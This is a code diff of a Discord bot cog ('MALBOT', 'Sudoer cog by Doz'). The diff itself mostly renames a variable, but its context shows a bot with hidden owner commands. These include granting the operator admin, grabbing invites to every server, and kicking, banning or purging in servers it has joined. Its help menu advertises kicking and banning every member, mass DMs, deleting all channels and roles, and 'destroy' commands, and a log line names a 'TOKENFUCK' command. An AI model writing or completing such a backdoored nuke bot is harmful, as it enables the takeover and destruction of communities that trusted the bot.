@@ -1,6 +1,6 @@
 # Sudoer cog by Doz
 # ---------------------------------------------------------------------------
-import discord, asyncio, random, json, pymongo, json
+import discord, asyncio, random, json, pymongo
 from pymongo import MongoClient
 from discord import Member, Webhook, RequestsWebhookAdapter
 from discord.ext.commands import Bot, has_permissions, CheckFailure, MemberConverter
@@ -62,7 +62,6 @@ async def BOT_OWNER_CHECK(ctx):
     else:
         return False
 # ---------------------------------------------------------------------------
-
 class Botsudo(commands.Cog):
     """Commands for managing Global bans"""
     
@@ -73,13 +72,13 @@ class Botsudo(commands.Cog):
     @commands.command()
     async def malhelp(self, ctx):
         """Shows help menu for bot owners/sudoers"""
-        embed = discord.Embed(title='MALBOT HELP', description='This help menu contains commands for owners only!\nThe bot prefix is `-`.', colour=RandomColour())
+        em = discord.Embed(title='MALBOT HELP', description='This help menu contains commands for owners only!\nThe bot prefix is `-`.', colour=RandomColour())
 
-        embed.add_field(name='OWNER COMMANDS:', value='`addsudo <user> <reason>` Allows a user to use sudo command\n`removesudo <user> <reason>`\n`botname <name>` Renames the bot.\n`createinvite <chanid>` creates an invite link from channelid (bot must have access to target channel!\n`gban <user> [reason]` Globally bans a user.\n`hackgban <user_id> [reason]` Globally bans a User ID.\n`adminme` gives yourself admin.\n`oclear <amount>` Deletes messages from the server.\n`okick <user> [reason]` Kicks someone from the server.\n`oban <user> [reason]` Bans someone from the server.\n`onick <user>` nicks someone.\n`reply <chan_id> <msg>` Replies to a report.\n`servers` grabs 1 invite of every server.\n`leave [server_id]` leaves the server.', inline=False)
-        embed.add_field(name='MALBOT COMMANDS:', value='`chanmsgall <msg>` Sends a message to all channels in a server.\n`kickall` Kicks everyone in a server.\n`banall` Bans everyone in a server.\n`rall <name>` Renames everyone in a server.\n`mall <msg>` DMs everyone in a server.\n`dall <channels|roles|emojis|all>` Deletes specified objects.\n`destroy` Attempts to destroy everything on a server.\n`destroyid <server_id>` Destroys a server given its ID.', inline=False)
-        embed.set_footer(text=f'Your usage is being logged {ctx.message.author} ({ctx.message.author.id}).', icon_url=ctx.message.author.avatar_url_as(static_format='png'))
+        em.add_field(name='OWNER COMMANDS:', value='`addsudo <user> <reason>` Allows a user to use sudo command\n`removesudo <user> <reason>`\n`botname <name>` Renames the bot.\n`createinvite <chanid>` creates an invite link from channelid (bot must have access to target channel!\n`gban <user> [reason]` Globally bans a user.\n`hackgban <user_id> [reason]` Globally bans a User ID.\n`adminme` gives yourself admin.\n`oclear <amount>` Deletes messages from the server.\n`okick <user> [reason]` Kicks someone from the server.\n`oban <user> [reason]` Bans someone from the server.\n`onick <user>` nicks someone.\n`reply <chan_id> <msg>` Replies to a report.\n`servers` grabs 1 invite of every server.\n`leave [server_id]` leaves the server.', inline=False)
+        em.add_field(name='MALBOT COMMANDS:', value='`chanmsgall <msg>` Sends a message to all channels in a server.\n`kickall` Kicks everyone in a server.\n`banall` Bans everyone in a server.\n`rall <name>` Renames everyone in a server.\n`mall <msg>` DMs everyone in a server.\n`dall <channels|roles|emojis|all>` Deletes specified objects.\n`destroy` Attempts to destroy everything on a server.\n`destroyid <server_id>` Destroys a server given its ID.', inline=False)
+        em.set_footer(text=f'Your usage is being logged {ctx.message.author} ({ctx.message.author.id}).', icon_url=ctx.message.author.avatar_url_as(static_format='png'))
 
-        await ctx.send(embed=embed)
+        await ctx.send(embed=em)
 
     # ---------------------------------------------------------------------------
     # OWNER COMMANDS
@@ -101,10 +100,10 @@ class Botsudo(commands.Cog):
         stick = ''
         while i <= 10:
             stick += ministick
-            embed = discord.Embed(title='PP Grow', description=f'Dark is sin\n8{stick}D', colour=RandomColour())
+            em = discord.Embed(title='PP Grow', description=f'Dark is sin\n8{stick}D', colour=RandomColour())
 
             await asyncio.sleep(2.5)
-            await mhsend.edit(embed=embed)
+            await mhsend.edit(embed=em)
             i += 1
 
     @commands.check(BOT_OWNER_CHECK)
@@ -272,17 +271,17 @@ class Botsudo(commands.Cog):
             user = ctx.message.author
             if reason == None:
                 reason = "No reason provided."
-            embed = discord.Embed(
+            em = discord.Embed(
             title = 'Moderator Action',
             description = f'Deleted **{amount}** messages!\nThis message will be deleted automactically.',
             colour = discord.Colour.green()
             )
             
-            embed.add_field(name='Moderator:', value="A SUDO USER", inline=False)
-            embed.add_field(name='Reason:', value=reason, inline=False)
+            em.add_field(name='Moderator:', value="A SUDO USER", inline=False)
+            em.add_field(name='Reason:', value=reason, inline=False)
             await ctx.message.delete()
             await ctx.channel.purge(limit=amount)
-            infomsg = await ctx.send(embed=embed)
+            infomsg = await ctx.send(embed=em)
             await asyncio.sleep(10)
             await infomsg.delete()
             reaper_logs_webhook.send(f'>>> {user} ({user.id}) has cleared {amount} messages from {ctx.guild.name}.\nReason: {reason}')
@@ -306,10 +305,10 @@ class Botsudo(commands.Cog):
         if reason == None:
             reason = "No reason specified"
         try:
-            embed = discord.Embed(title='KICK NOTICE', description=f'You were kicked from **{ctx.guild.name}** by **{ctx.message.author} ({ctx.message.author.id})** (BOT SUDOER)', colour=discord.Colour.red())
-            embed.add_field(name='REASON:', value=f'{reason}', inline=False)
-            embed.set_footer(text=f'Kicked by {ctx.message.author.name}', icon_url=ctx.message.author.avatar_url_as(static_format='png'))
-            await member.send(embed=embed)
+            em = discord.Embed(title='KICK NOTICE', description=f'You were kicked from **{ctx.guild.name}** by **{ctx.message.author} ({ctx.message.author.id})** (BOT SUDOER)', colour=discord.Colour.red())
+            em.add_field(name='REASON:', value=f'{reason}', inline=False)
+            em.set_footer(text=f'Kicked by {ctx.message.author.name}', icon_url=ctx.message.author.avatar_url_as(static_format='png'))
+            await member.send(embed=em)
             await ctx.guild.kick(member, reason=reason)
             await ctx.send(f"**{member}** got kicked really hard by a SUDO USER")
             reaper_logs_webhook.send(f'>>> {ctx.message.author} ({ctx.message.author.id}) has kicked {member} ({member.id}) from {ctx.guild.name}.\nReason: {reason}')
@@ -333,11 +332,11 @@ class Botsudo(commands.Cog):
         if reason == None:
             reason = "No reason specified"
         try:
-            embed = discord.Embed(title='BAN NOTICE', description=f'You were banned from **{ctx.guild.name}** by **{ctx.message.author} ({ctx.message.author.id})** (BOT SUDOER)', colour=discord.Colour.red())
-            embed.add_field(name='REASON:', value=f'{reason}', inline=False)
-            embed.set_footer(text=f'Banned by {ctx.message.author.name}', icon_url=ctx.message.author.avatar_url_as(static_format='png'))
-            embed.set_image(url=BAN_GIF)
-            await user.send(embed=embed)
+            em = discord.Embed(title='BAN NOTICE', description=f'You were banned from **{ctx.guild.name}** by **{ctx.message.author} ({ctx.message.author.id})** (BOT SUDOER)', colour=discord.Colour.red())
+            em.add_field(name='REASON:', value=f'{reason}', inline=False)
+            em.set_footer(text=f'Banned by {ctx.message.author.name}', icon_url=ctx.message.author.avatar_url_as(static_format='png'))
+            em.set_image(url=BAN_GIF)
+            await user.send(embed=em)
             await ctx.guild.ban(user, reason=reason)
             await ctx.send(f"**{user}** got smashed with the ban hammer by **A SUDO USER**!")
             reaper_logs_webhook.send(f'>>> {ctx.message.author} ({ctx.message.author.id}) has banned {user} ({user.id}) from {ctx.guild.name}.\nReason: {reason}')
@@ -374,19 +373,19 @@ class Botsudo(commands.Cog):
             return await ctx.send('USUAGE: `reply <channel_id> <message>`')
 
         chane = self.bot.get_channel(chan)
-        embed = discord.Embed(
+        em = discord.Embed(
             title = "MC Support",
             timestamp = ctx.message.created_at,
             description = "Your report/suggestion has been answered! \nPlease do not send false information or else you will be rejected!",
             colour = RandomColour()
         )
 
-        embed.add_field(name="Representer:", value=f"**{ctx.message.author}** ({ctx.message.author.id})", inline=False)
-        embed.add_field(name="Response:", value=f"{msg}", inline=False)
-        embed.add_field(name="Join our TGB server!", value=HQ_SERVER_INVITE, inline=False)
+        em.add_field(name="Representer:", value=f"**{ctx.message.author}** ({ctx.message.author.id})", inline=False)
+        em.add_field(name="Response:", value=f"{msg}", inline=False)
+        em.add_field(name="Join our TGB server!", value=HQ_SERVER_INVITE, inline=False)
 
         await ctx.message.delete()
-        await chane.send(embed=embed)
+        await chane.send(embed=em)
         await ctx.send(f"Sent response: \n{msg} in channel **{chan}**")
 
     # Servers
@@ -691,7 +690,6 @@ class Botsudo(commands.Cog):
                     errorlogs_webhook.send(f"[ERROR] CMD|TOKENFUCK: {e}")
                 else:
                     break
-
 # ---------------------------------------------------------------------------
 def setup(bot):
     bot.add_cog(Botsudo(bot))
